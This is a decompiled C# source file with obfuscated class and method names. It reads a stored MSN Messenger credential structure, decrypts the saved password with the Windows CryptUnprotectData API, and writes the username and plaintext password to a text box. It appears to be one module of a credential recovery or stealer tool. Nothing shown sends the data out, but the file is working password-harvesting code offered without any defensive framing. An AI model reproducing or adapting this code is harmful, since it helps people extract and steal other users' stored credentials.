using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace ns3;

internal sealed class Class14
{
	internal struct Struct3
	{
		public int int_0;

		public int int_1;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_0;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_1;

		public long long_0;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public IntPtr intptr_0;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_2;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_3;
	}

	internal struct Struct4
	{
		public int int_0;

		public int int_1;
	}

	internal struct Struct5
	{
		public string string_0;

		public string string_1;
	}

	private static Struct3 struct3_0;

	public static IntPtr intptr_0 = IntPtr.Zero;

	public static Struct4 struct4_0;

	public static Struct4 struct4_1;

	public static Struct5 struct5_0;

	[DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern bool CryptUnprotectData(ref Struct4 struct4_2, int int_0, int int_1, int int_2, int int_3, int int_4, Struct4 struct4_3);

	public static void smethod_0()
	{
		try
		{
			IntPtr ptr = Marshal.ReadIntPtr(intptr_0, 0);
			object? obj = Marshal.PtrToStructure(ptr, struct3_0.GetType());
			Struct3 @struct = default(Struct3);
			struct3_0 = ((obj != null) ? ((Struct3)obj) : @struct);
			struct4_0.int_1 = struct3_0.int_3;
			struct4_0.int_0 = struct3_0.int_2;
			CryptUnprotectData(ref struct4_0, 0, 0, 0, 0, 1, struct4_1);
			struct4_1.int_1 = struct4_0.int_1;
			struct5_0.string_0 = struct3_0.string_3;
			IntPtr ptr2 = new IntPtr(struct4_1.int_1);
			struct5_0.string_1 = Marshal.PtrToStringUni(ptr2);
			string text = "\r\n";
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("============MSN==============");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Username: " + struct5_0.string_0);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Password: " + struct5_0.string_1);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text2 = "\r\n";
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("============MSN==============");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("MSN Could not be recovered!");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			ProjectData.ClearProjectError();
		}
	}
}
